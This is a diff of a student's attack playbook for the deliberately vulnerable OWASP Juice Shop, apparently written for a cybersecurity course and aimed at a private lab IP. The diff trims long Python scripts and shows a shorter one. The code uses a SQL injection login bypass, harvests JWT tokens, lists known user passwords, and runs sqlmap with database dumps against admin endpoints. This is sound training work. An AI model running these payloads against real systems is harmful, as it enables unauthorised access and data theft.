@@ -431,366 +431,66 @@ sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
 #### 2. Using Authorization Headers
 
 ```zsh
-# Using Bearer token in Authorization header
-sqlmap -u "http://10.30.0.237:3000/rest/products/search?q=test" \
-  --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..." \
-  --dbms=sqlite --batch
-
-# Using custom headers for admin endpoints
+# Using Bearer token in Authorization header (recommended for Juice Shop)
 sqlmap -u "http://10.30.0.237:3000/rest/admin/application-configuration" \
   --headers="Authorization: Bearer YOUR_JWT_TOKEN_HERE" \
   --headers="Content-Type: application/json" \
-  --dbms=sqlite --batch
-```
-
-#### 3. Automated Token Extraction and Usage
-
-```python
-#!/usr/bin/env python3
-"""
-SQLMap with JWT Token Authentication for Juice Shop
-"""
-import requests
-import subprocess
-import json
-import re
-import time
-
-class JuiceShopAuthenticatedSQLi:
-    def __init__(self, base_url="http://10.30.0.237:3000"):
-        self.base_url = base_url
-        self.token = None
-        self.session = requests.Session()
-
-    def authenticate(self, email="admin@juice-sh.op' OR 1=1--", password="password"):
-        """Get JWT token through login"""
-        login_data = {
-            "email": email,
-            "password": password
-        }
-
-        response = self.session.post(
-            f"{self.base_url}/rest/user/login",
-            json=login_data,
-            headers={"Content-Type": "application/json"}
-        )
-
-        if response.status_code == 200:
-            data = response.json()
-            self.token = data.get("authentication", {}).get("token")
-            if self.token:
-                print(f"[+] Successfully obtained JWT token: {self.token[:50]}...")
-                return True
-
-        print("[-] Failed to obtain token")
-        return False
-
-    def run_authenticated_sqlmap(self, target_url, additional_args=""):
-        """Run SQLMap with authentication token"""
-        if not self.token:
-            print("[-] No token available. Authenticate first.")
-            return False
-
-        cmd = [
-            "sqlmap", "-u", target_url,
-            "--headers", f"Authorization: Bearer {self.token}",
-            "--headers", "Content-Type: application/json",
-            "--dbms=sqlite", "--batch"
-        ]
-
-        if additional_args:
-            cmd.extend(additional_args.split())
-
-        print(f"[+] Running authenticated SQLMap: {' '.join(cmd)}")
-
-        try:
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
-            return {
-                "success": result.returncode == 0,
-                "output": result.stdout,
-                "errors": result.stderr
-            }
-        except subprocess.TimeoutExpired:
-            return {"success": False, "errors": "Timeout expired"}
-
-    def test_authenticated_endpoints(self):
-        """Test endpoints that require authentication"""
-        authenticated_targets = [
-            {
-                "name": "User Profile",
-                "url": f"{self.base_url}/rest/user/whoami",
-                "args": ""
-            },
-            {
-                "name": "Admin Configuration",
-                "url": f"{self.base_url}/rest/admin/application-configuration",
-                "args": "--technique=B"
-            },
-            {
-                "name": "User Authentication Details",
-                "url": f"{self.base_url}/rest/user/authentication-details",
-                "args": "--dump"
-            },
-            {
-                "name": "Basket Items",
-                "url": f"{self.base_url}/rest/basket/1",
-                "args": "--technique=BEU"
-            }
-        ]
-
-        results = []
-        for target in authenticated_targets:
-            print(f"\n[+] Testing authenticated endpoint: {target['name']}")
-            result = self.run_authenticated_sqlmap(target["url"], target["args"])
-            results.append({
-                "endpoint": target["name"],
-                "url": target["url"],
-                "result": result
-            })
-
-        return results
-
-    def generate_authenticated_report(self, results):
-        """Generate report for authenticated testing"""
-        report = {
-            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
-            "token_used": self.token[:50] + "..." if self.token else "None",
-            "total_endpoints": len(results),
-            "successful_tests": len([r for r in results if r["result"]["success"]]),
-            "results": results
-        }
-
-        with open("juice_shop_authenticated_sqli_report.json", "w") as f:
-            json.dump(report, f, indent=2)
-
-        print(f"\n{'='*50}")
-        print("AUTHENTICATED SQL INJECTION REPORT")
-        print(f"{'='*50}")
-        print(f"Total endpoints tested: {report['total_endpoints']}")
-        print(f"Successful tests: {report['successful_tests']}")
-        print("Report saved to: juice_shop_authenticated_sqli_report.json")
-
-        return report
-
-if __name__ == "__main__":
-    # Initialize tester
-    auth_tester = JuiceShopAuthenticatedSQLi()
-
-    # Authenticate and get token
-    if auth_tester.authenticate():
-        # Test authenticated endpoints
-        results = auth_tester.test_authenticated_endpoints()
-        auth_tester.generate_authenticated_report(results)
-    else:
-        print("Authentication failed. Cannot proceed with authenticated testing.")
-```
-
-#### 4. Session-Based SQLMap Testing
-
-```zsh
-# First, get a session by logging in
-curl -c cookies.txt -X POST "http://10.30.0.237:3000/rest/user/login" \
-  -H "Content-Type: application/json" \
-  -d '{"email":"admin@juice-sh.op'\'' OR 1=1--","password":"password"}'
-
-# Use the saved cookies with SQLMap
-sqlmap -u "http://10.30.0.237:3000/rest/user/whoami" \
-  --load-cookies=cookies.txt \
-  --dbms=sqlite --batch --technique=B
-
-# Test admin endpoints with session
-sqlmap -u "http://10.30.0.237:3000/rest/admin/application-configuration" \
-  --load-cookies=cookies.txt \
   --dbms=sqlite --batch --dump
 ```
 
-#### 5. Advanced Token-Based Testing
+#### 3. Automated Token Extraction and Injection/Dump Script
 
 ```python
+# filepath: /Users/ziaparvaresh/OneDrive/OneDrive - TAFE NSW/CyberSecurityVI/Cyber Project/attack-playbooks/Juice_Shop_All_Challenges.md
 #!/usr/bin/env python3
 """
-Advanced Token-Based SQLMap Testing for Juice Shop
+Automate SQL Injection with JWT Auth for Juice Shop
 """
 import requests
 import subprocess
 import json
 import time
-import base64
 
-class AdvancedJuiceShopSQLi:
-    def __init__(self, base_url="http://10.30.0.237:3000"):
-        self.base_url = base_url
-        self.tokens = {}
-        self.session = requests.Session()
+BASE_URL = "http://10.30.0.237:3000"
+LOGIN_URL = f"{BASE_URL}/rest/user/login"
+INJECT_URL = f"{BASE_URL}/rest/admin/application-configuration"
 
-    def decode_jwt(self, token):
-        """Decode JWT token to inspect claims"""
-        try:
-            # JWT has 3 parts separated by dots
-            header, payload, signature = token.split('.')
+def get_jwt_token(email, password):
+    resp = requests.post(
+        LOGIN_URL,
+        json={"email": email, "password": password},
+        headers={"Content-Type": "application/json"}
+    )
+    if resp.status_code == 200:
+        data = resp.json()
+        token = data.get("authentication", {}).get("token")
+        if token:
+            print(f"[+] Got JWT token: {token[:40]}...")
+            return token
+    print("[-] Failed to get JWT token")
+    return None
 
-            # Add padding if needed
-            payload += '=' * (4 - len(payload) % 4)
-
-            # Decode base64
-            decoded = base64.b64decode(payload)
-            return json.loads(decoded)
-        except Exception as e:
-            print(f"Error decoding JWT: {e}")
-            return None
-
-    def get_multiple_tokens(self):
-        """Get tokens for different user roles"""
-        users = [
-            {"email": "admin@juice-sh.op' OR 1=1--", "password": "password", "role": "admin"},
-            {"email": "jim@juice-sh.op", "password": "ncc-1701", "role": "user"},
-            {"email": "bender@juice-sh.op", "password": "OhG0dPlease1nsertLiquor!", "role": "user"}
-        ]
-
-        for user in users:
-            response = self.session.post(
-                f"{self.base_url}/rest/user/login",
-                json={"email": user["email"], "password": user["password"]},
-                headers={"Content-Type": "application/json"}
-            )
-
-            if response.status_code == 200:
-                data = response.json()
-                token = data.get("authentication", {}).get("token")
-                if token:
-                    self.tokens[user["role"]] = token
-                    decoded = self.decode_jwt(token)
-                    print(f"[+] Got {user['role']} token: {token[:30]}...")
-                    if decoded:
-                        print(f"    User ID: {decoded.get('data', {}).get('id')}")
-                        print(f"    Email: {decoded.get('data', {}).get('email')}")
-
-    def test_role_based_sqli(self):
-        """Test SQL injection with different user roles"""
-        endpoints = [
-            {"url": f"{self.base_url}/rest/user/whoami", "roles": ["admin", "user"]},
-            {"url": f"{self.base_url}/rest/admin/application-configuration", "roles": ["admin"]},
-            {"url": f"{self.base_url}/rest/basket/1", "roles": ["admin", "user"]},
-            {"url": f"{self.base_url}/rest/user/authentication-details", "roles": ["admin"]},
-        ]
-
-        results = []
-        for endpoint in endpoints:
-            for role in endpoint["roles"]:
-                if role in self.tokens:
-                    print(f"\n[+] Testing {endpoint['url']} with {role} token")
-
-                    cmd = [
-                        "sqlmap", "-u", endpoint["url"],
-                        "--headers", f"Authorization: Bearer {self.tokens[role]}",
-                        "--headers", "Content-Type: application/json",
-                        "--dbms=sqlite", "--batch", "--technique=B"
-                    ]
-
-                    try:
-                        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
-                        results.append({
-                            "endpoint": endpoint["url"],
-                            "role": role,
-                            "success": result.returncode == 0,
-                            "output": result.stdout,
-                            "vulnerable": "injectable" in result.stdout.lower()
-                        })
-                    except subprocess.TimeoutExpired:
-                        results.append({
-                            "endpoint": endpoint["url"],
-                            "role": role,
-                            "success": False,
-                            "error": "Timeout"
-                        })
-
-        return results
-
-    def parameter_injection_test(self):
-        """Test parameter-based injection with tokens"""
-        injection_points = [
-            {
-                "url": f"{self.base_url}/rest/products/search",
-                "param": "q",
-                "value": "test"
-            },
-            {
-                "url": f"{self.base_url}/rest/track-order/1",
-                "param": "id",
-                "value": "1"
-            },
-            {
-                "url": f"{self.base_url}/rest/user/change-password",
-                "param": "current",
-                "value": "test",
-                "method": "POST"
-            }
-        ]
-
-        for point in injection_points:
-            if "admin" in self.tokens:
-                print(f"\n[+] Testing parameter injection at {point['url']}")
-
-                if point.get("method") == "POST":
-                    data_param = f'{{"{point["param"]}":"{point["value"]}"}}'
-                    cmd = [
-                        "sqlmap", "-u", point["url"],
-                        "--data", data_param,
-                        "--headers", f"Authorization: Bearer {self.tokens['admin']}",
-                        "--headers", "Content-Type: application/json",
-                        "--dbms=sqlite", "--batch", "--level=3"
-                    ]
-                else:
-                    cmd = [
-                        "sqlmap", "-u", f"{point['url']}?{point['param']}={point['value']}",
-                        "--headers", f"Authorization: Bearer {self.tokens['admin']}",
-                        "--dbms=sqlite", "--batch", "--level=3"
-                    ]
-
-                try:
-                    subprocess.run(cmd, timeout=180)
-                except subprocess.TimeoutExpired:
-                    print(f"[-] Timeout testing {point['url']}")
-
-    def generate_comprehensive_report(self, role_results):
-        """Generate comprehensive test report"""
-        report = {
-            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
-            "tokens_obtained": list(self.tokens.keys()),
-            "total_tests": len(role_results),
-            "vulnerable_endpoints": len([r for r in role_results if r.get("vulnerable", False)]),
-            "results": role_results
-        }
-
-        with open("advanced_juice_shop_sqli_report.json", "w") as f:
-            json.dump(report, f, indent=2)
-
-        print(f"\n{'='*60}")
-        print("ADVANCED SQL INJECTION TEST REPORT")
-        print(f"{'='*60}")
-        print(f"Tokens obtained: {', '.join(self.tokens.keys())}")
-        print(f"Total tests: {report['total_tests']}")
-        print(f"Vulnerable endpoints: {report['vulnerable_endpoints']}")
-        print("Report saved to: advanced_juice_shop_sqli_report.json")
-
-        return report
+def run_sqlmap_with_token(url, token):
+    cmd = [
+        "sqlmap", "-u", url,
+        "--headers", f"Authorization: Bearer {token}",
+        "--headers", "Content-Type: application/json",
+        "--dbms=sqlite", "--batch", "--dump"
+    ]
+    print(f"[+] Running: {' '.join(cmd)}")
+    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
+    print(result.stdout)
+    if result.stderr:
+        print(result.stderr)
+    return result.returncode == 0
 
 if __name__ == "__main__":
-    # Initialize advanced tester
-    advanced_tester = AdvancedJuiceShopSQLi()
-
-    # Get tokens for different roles
-    print("[+] Obtaining authentication tokens...")
-    advanced_tester.get_multiple_tokens()
-
-    # Test role-based SQL injection
-    print("\n[+] Starting role-based SQL injection testing...")
-    role_results = advanced_tester.test_role_based_sqli()
-
-    # Test parameter injection
-    print("\n[+] Starting parameter injection testing...")
-    advanced_tester.parameter_injection_test()
-
-    # Generate comprehensive report
-    advanced_tester.generate_comprehensive_report(role_results)
+    # Use a valid admin or known user account
+    email = "admin@juice-sh.op' OR 1=1--"
+    password = "password"
+    token = get_jwt_token(email, password)
+    if token:
+        run_sqlmap_with_token(INJECT_URL, token)
+    else:
+        print("[-] Cannot proceed without token.")
 ```
